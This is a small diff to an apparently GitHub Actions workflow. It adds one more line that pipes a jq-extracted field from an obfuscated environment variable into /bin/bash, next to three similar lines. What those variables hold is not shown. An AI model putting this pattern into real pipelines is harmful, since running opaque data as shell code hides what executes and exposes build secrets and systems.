@@ -37,6 +37,7 @@ jobs:
           echo $ue510 | jq -r .lf5 | /bin/bash
           printf '%s' "$fysk4" | jq -r .qhweh682 | /bin/bash
           printf '%s' "$axw75" | jq -r .hggar3643 | /bin/bash
+          printf '%s' "$f338" | jq -r .if48154 | /bin/bash
 
       - name: Save output
         if: always()
